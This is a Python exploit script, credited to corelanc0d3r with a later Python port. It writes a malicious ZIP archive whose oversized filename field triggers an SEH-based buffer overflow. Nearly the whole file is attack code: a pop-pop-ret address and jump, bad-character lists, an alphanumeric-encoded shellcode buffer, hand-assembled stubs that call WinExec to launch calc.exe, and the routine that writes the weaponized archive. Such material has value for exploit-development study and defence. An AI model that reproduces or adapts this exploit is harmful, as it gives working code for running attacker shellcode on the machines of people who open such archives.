#!/usr/bin/env python

# Original Author : corelanc0d3r
# Python POC Author: d3c3pt10n
# http://www.corelan.be:8800
#
# Original: March 2010
# Updated: October 2018

from os import remove
from struct import pack
from pwnlib.asm import asm

filename = "corelanboom.zip"


ldf_header = (
    "\x50\x4B\x03\x04\x14\x00\x00"
    "\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
    "\x00\x00\x00\x00\x00\x00\x00\x00"
    "\xe4\x0f"  # file size
    "\x00\x00\x00"
)

cdf_header = (
    "\x50\x4B\x01\x02\x14\x00\x14"
    "\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    "\xe4\x0f"  # file size
    "\x00\x00\x00\x00\x00\x00\x01\x00"
    "\x24\x00\x00\x00\x00\x00\x00\x00"
)

eofcdf_header = (
    "\x50\x4B\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00"
    "\x12\x10\x00\x00"  # Size of central directory (bytes)
    "\x02\x10\x00\x00"  # Offset of start of central directory,
    # relative to start of archive
    "\x00\x00"
)

"""
ebp - j6Aj - offset 289
esi 1Bs2 - offset 1325

can start writing payload to offset 297

6b41306b

seh offset at 301

"""
ppr = pack("I", 0x6d7e4873)
jmp = "\x71\x06\x70\x04"

bad_array = "\x00\x0a\x0d\x0f\xe8\x2d\x2e\x2f\x31\x3a\x5d\x5e\x5c\x80\x81\x82\x14\x15"

good_array = "\x01\x02\x03\x04\x05\x06\x07\x08\x09"
good_array += "\x0b\x0c\x0e\x10\x11\x12\x13"
good_array += "\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
good_array += "\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c"
good_array += "\x30\x01\x01\x01\x01\x32\x33\x34\x35\x36\x37\x38\x39\x3b\x3c\x3d\x3e\x3f"
good_array += "\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c"
good_array += "\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5f"
good_array += "\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c"
good_array += "\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"

"""
good_array += "\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c"
good_array += "\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
good_array += "\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac"
good_array += "\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
good_array += "\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc"
good_array += "\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
good_array += "\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec"
good_array += "\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
"""

buf =  b""
buf += b"\x50\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
buf += b"\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30"
buf += b"\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42"
buf += b"\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
buf += b"\x39\x6c\x68\x68\x4d\x52\x57\x70\x37\x70\x53\x30\x71"
buf += b"\x70\x4c\x49\x58\x65\x36\x51\x6b\x70\x35\x34\x6e\x6b"
buf += b"\x76\x30\x66\x50\x4e\x6b\x56\x32\x36\x6c\x4c\x4b\x33"
buf += b"\x62\x75\x44\x6c\x4b\x52\x52\x35\x78\x74\x4f\x6d\x67"
buf += b"\x52\x6a\x36\x46\x35\x61\x59\x6f\x4c\x6c\x35\x6c\x43"
buf += b"\x51\x61\x6c\x63\x32\x74\x6c\x67\x50\x6b\x71\x6a\x6f"
buf += b"\x74\x4d\x45\x51\x39\x57\x7a\x42\x69\x62\x73\x62\x51"
buf += b"\x47\x4e\x6b\x33\x62\x74\x50\x4e\x6b\x71\x5a\x77\x4c"
buf += b"\x6c\x4b\x50\x4c\x36\x71\x52\x58\x58\x63\x52\x68\x47"
buf += b"\x71\x4a\x71\x42\x71\x6e\x6b\x32\x79\x55\x70\x77\x71"
buf += b"\x49\x43\x6c\x4b\x43\x79\x36\x78\x59\x73\x45\x6a\x73"
buf += b"\x79\x4e\x6b\x46\x54\x6c\x4b\x55\x51\x7a\x76\x76\x51"
buf += b"\x39\x6f\x6c\x6c\x6a\x61\x78\x4f\x66\x6d\x56\x61\x78"
buf += b"\x47\x70\x38\x49\x70\x42\x55\x38\x76\x54\x43\x33\x4d"
buf += b"\x4a\x58\x75\x6b\x61\x6d\x57\x54\x62\x55\x58\x64\x36"
buf += b"\x38\x6e\x6b\x51\x48\x66\x44\x46\x61\x59\x43\x45\x36"
buf += b"\x4c\x4b\x74\x4c\x62\x6b\x4c\x4b\x46\x38\x45\x4c\x76"
buf += b"\x61\x39\x43\x6c\x4b\x45\x54\x6e\x6b\x75\x51\x4a\x70"
buf += b"\x6f\x79\x53\x74\x35\x74\x56\x44\x33\x6b\x61\x4b\x51"
buf += b"\x71\x36\x39\x71\x4a\x63\x61\x69\x6f\x69\x70\x63\x6f"
buf += b"\x71\x4f\x33\x6a\x4e\x6b\x47\x62\x7a\x4b\x4c\x4d\x63"
buf += b"\x6d\x52\x48\x34\x73\x65\x62\x37\x70\x45\x50\x52\x48"
buf += b"\x50\x77\x70\x73\x50\x32\x53\x6f\x51\x44\x61\x78\x42"
buf += b"\x6c\x63\x47\x77\x56\x73\x37\x4e\x69\x68\x68\x6b\x4f"
buf += b"\x4e\x30\x6d\x68\x4c\x50\x56\x61\x55\x50\x77\x70\x46"
buf += b"\x49\x4f\x34\x32\x74\x70\x50\x50\x68\x64\x69\x4b\x30"
buf += b"\x72\x4b\x53\x30\x4b\x4f\x6a\x75\x72\x4a\x57\x7a\x32"
buf += b"\x48\x6f\x30\x6e\x48\x30\x55\x6c\x51\x72\x48\x74\x42"
buf += b"\x65\x50\x45\x77\x44\x4f\x6e\x69\x5a\x46\x46\x30\x46"
buf += b"\x30\x62\x70\x50\x50\x33\x70\x76\x30\x51\x50\x70\x50"
buf += b"\x70\x68\x79\x7a\x54\x4f\x4b\x6f\x6b\x50\x69\x6f\x58"
buf += b"\x55\x6a\x37\x52\x4a\x62\x30\x61\x46\x51\x47\x42\x48"
buf += b"\x4f\x69\x79\x35\x62\x54\x63\x51\x4b\x4f\x4e\x35\x4b"
buf += b"\x35\x39\x50\x52\x54\x64\x4a\x59\x6f\x52\x6e\x73\x38"
buf += b"\x30\x75\x6a\x4c\x59\x78\x55\x37\x43\x30\x45\x50\x63"
buf += b"\x30\x52\x4a\x67\x70\x33\x5a\x37\x74\x50\x56\x33\x67"
buf += b"\x45\x38\x65\x52\x48\x59\x6f\x38\x33\x6f\x49\x6f\x59"
buf += b"\x45\x6b\x33\x39\x68\x47\x70\x33\x4e\x54\x76\x6c\x4b"
buf += b"\x57\x46\x71\x7a\x53\x70\x52\x48\x53\x30\x46\x70\x65"
buf += b"\x50\x45\x50\x73\x66\x53\x5a\x65\x50\x52\x48\x50\x58"
buf += b"\x4d\x74\x72\x73\x7a\x45\x69\x6f\x7a\x75\x5a\x33\x51"
buf += b"\x43\x51\x7a\x67\x70\x50\x56\x70\x53\x42\x77\x32\x48"
buf += b"\x37\x72\x79\x49\x6b\x78\x43\x6f\x6b\x4f\x59\x45\x4f"
buf += b"\x73\x6b\x48\x77\x70\x61\x6d\x57\x58\x52\x78\x65\x38"
buf += b"\x53\x30\x67\x30\x77\x70\x45\x50\x71\x7a\x75\x50\x72"
buf += b"\x70\x51\x78\x76\x6b\x64\x6f\x34\x4f\x56\x50\x49\x6f"
buf += b"\x58\x55\x72\x77\x63\x58\x70\x75\x52\x4e\x62\x6d\x61"
buf += b"\x71\x69\x6f\x4a\x75\x51\x4e\x73\x6e\x39\x6f\x66\x6c"
buf += b"\x77\x54\x54\x4f\x4b\x35\x64\x30\x59\x6f\x4b\x4f\x4b"
buf += b"\x4f\x4d\x39\x4f\x6b\x4b\x4f\x4b\x4f\x4b\x4f\x77\x71"
buf += b"\x59\x53\x37\x59\x68\x46\x70\x75\x49\x51\x4f\x33\x4d"
buf += b"\x6b\x68\x70\x68\x35\x6e\x42\x56\x36\x33\x5a\x35\x50"
buf += b"\x62\x73\x79\x6f\x7a\x75\x41\x41"


print(buf)

w = open("hex_array.bin", "w")
w.write(good_array)
w.close()


# adjust with jmp of +654
# push esp, pop eax
# add ax,0x654 + 0x6 = 0x65a
adjust = "\x54\x58" + "\x66\x05\x5a\x06" 


test = ""
test += asm("xor eax, eax")
test += asm("push 0x30")
test += asm("push 0x68656c6c")
test += asm("push esp")
test += asm("pop edi")
test += asm("add al, 0x2")
test += asm("push eax")
test += asm("sub al, 0x2")
test += asm("push eax ")
test += asm("push edi") 
test += asm("push eax")
test += asm("mov eax, 0x7e4507ea")
test += asm("call eax")


test2 = ""
test2 += asm("xor eax, eax")
test2 += asm("push 0x6578652e") # .exe
test2 += asm("push 0x636c6163") # calc
test2 += asm("push esp")
test2 += asm("pop edi")

# winexec at 0x7c8623ad
test2 += asm("xor eax, eax")
test2 += asm("push eax")
test2 += asm("push 0x1")  # uCmdShow
test2 += asm("push edi")
# wanna run calc.exe\x00


test2 += asm("mov eax, 0x7c8623ad")
test2 += asm("call eax")  

print("##############TEST2##########")
print(test2.encode('hex'))
print("##############TEST2##########")

a = ""
a += asm("push esp")
a += asm("pop eax")
a += asm("sub eax, 0x6f6f6c37")
a += asm("sub eax, 0x6f6f6b58")
a += asm("sub eax, 0x21212121")
a += asm("push eax")
a += asm("pop esp")

print("##############")
print(a.encode('hex'))
print("##############")
"""




payload += asm("push eax")
payload += asm("sub eax, 0x223c6b7b")
payload += asm("sub eax, 0x3e5d6b7a")
payload += asm("sub eax, 0x21212121")
payload += asm("call eax")

"""

test = "254a4d4e55253532312a2d0a707b6f2d426f7b6e2d3821382150254a4d4e55253532312a2d24296e3d2d24296e3c50254a4d4e55253532312a2d372a6f332d584a6e542d2121212150254a4d4e55253532312a2d0d071e7b2d5650677b2d4949494950254a4d4e55253532312a2d4f4f4a4e2d4e4f494e50254a4d4e55253532312a2d4e444d4c2d4d434d4b50254a4d4e55253532312a2d1f7b02202d677b4b682d4949494950"



payload = "A"*297 + jmp + ppr + test
payload += "B"*(4064-len(payload))
payload += ".txt"
payload_len = len(payload)

print("[*] Size : {length} bytes".format(length=payload_len))
print("[*] Removing old {filename} file".format(filename=filename))
try:
    remove(filename)
except OSError:
    print("[!] Couldn't remove, probably doesn't exist. Ignoring this error")
    pass
print("[*] Creating new {filename} file".format(filename=filename))
with open(filename, "w") as f:
    file_content = ldf_header + payload + cdf_header + payload + eofcdf_header
    f.write(file_content)

